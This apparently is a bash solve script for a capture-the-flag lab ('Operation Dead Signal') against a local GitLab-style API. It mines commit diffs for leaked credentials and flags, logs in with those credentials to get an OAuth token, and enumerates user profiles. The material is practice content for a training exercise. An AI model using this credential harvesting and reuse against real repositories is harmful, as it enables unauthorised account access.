#!/usr/bin/env bash
# Operation Dead Signal — automated solve script
# Usage: bash solve.sh [http://localhost:3000]
set -euo pipefail

TARGET="${1:-http://localhost:3000}"

banner() { echo ""; echo "══════════════════════════════════════════"; echo "  $*"; echo "══════════════════════════════════════════"; }

banner "STEP 1 — Enumerate public repos (unauthenticated)"

PROJECTS=$(curl -sf "${TARGET}/api/v4/projects?visibility=public")
echo "[*] Public projects:"
echo "$PROJECTS" | python3 -c "
import sys, json
for p in json.load(sys.stdin):
    print(f'  [{p[\"id\"]}] {p[\"name\"]} — {p.get(\"description\",\"\")}')
"

PROJECT_ID=$(echo "$PROJECTS" | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")
echo "[+] Target project ID: ${PROJECT_ID}"

banner "STEP 2 — Enumerate commit history"

COMMITS=$(curl -sf "${TARGET}/api/v4/projects/${PROJECT_ID}/repository/commits")
echo "[*] Commits:"
echo "$COMMITS" | python3 -c "
import sys, json
for c in json.load(sys.stdin):
    print(f'  {c[\"id\"][:12]}  {c[\"title\"]}')
"

COMMIT_IDS=$(echo "$COMMITS" | python3 -c "
import sys, json
for c in json.load(sys.stdin):
    print(c['id'])
")

banner "STEP 3 — Inspect each commit diff for credentials / flags"

FLAG1=""
LEAKED_USER=""
LEAKED_PASS=""

while IFS= read -r SHA; do
  DIFF=$(curl -sf "${TARGET}/api/v4/projects/${PROJECT_ID}/repository/commits/${SHA}/diff")
  CONTENT=$(echo "$DIFF" | python3 -c "
import sys, json
diffs = json.load(sys.stdin)
for d in diffs:
    print(d.get('diff',''))
" 2>/dev/null || true)

  if echo "$CONTENT" | grep -q "CF2026"; then
    echo "[!] Flag found in commit ${SHA:0:12}!"
    echo "$CONTENT" | grep "CF2026"
    FLAG1=$(echo "$CONTENT" | grep -o 'CF2026{[^}]*}' | head -1)
  fi

  if echo "$CONTENT" | grep -q "username"; then
    LEAKED_USER=$(echo "$CONTENT" | grep "^+username" | awk '{print $3}' | head -1)
    LEAKED_PASS=$(echo "$CONTENT" | grep "^+password" | awk '{print $3}' | head -1)
    if [ -n "$LEAKED_USER" ]; then
      echo "[+] Leaked credentials: ${LEAKED_USER} / ${LEAKED_PASS}"
    fi
  fi
done <<< "$COMMIT_IDS"

echo ""
echo "[+] FLAG 1: ${FLAG1}"

banner "STEP 4 — Authenticate with leaked credentials"

TOKEN=$(curl -sf --request POST "${TARGET}/oauth/token" \
  --data "grant_type=password&username=${LEAKED_USER}&password=${LEAKED_PASS}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "[+] Authenticated as: ${LEAKED_USER}"
echo "[+] Token: ${TOKEN:0:20}..."

banner "STEP 5 — Enumerate users and hunt for Flag 2"

FLAG2=""
for UID in $(seq 1 15); do
  RESP=$(curl -sf "${TARGET}/api/v4/users/${UID}" \
    --header "Authorization: Bearer ${TOKEN}" 2>/dev/null || true)
  [ -z "$RESP" ] && continue

  USERNAME=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('username',''))" 2>/dev/null || true)
  PUB_EMAIL=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('public_email','') or '')" 2>/dev/null || true)
  BIO=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('bio','') or '')" 2>/dev/null || true)

  if echo "$PUB_EMAIL $BIO" | grep -q "CF2026"; then
    FLAG2=$(echo "$PUB_EMAIL $BIO" | grep -o 'CF2026{[^}]*}' | head -1)
    echo "[!] Flag 2 found on user: ${USERNAME} (ID ${UID})"
    echo "    public_email: ${PUB_EMAIL}"
  fi
done

echo ""
echo "[+] FLAG 2: ${FLAG2}"

banner "RESULTS"
echo "  Flag 1: ${FLAG1}"
echo "  Flag 2: ${FLAG2}"
echo ""
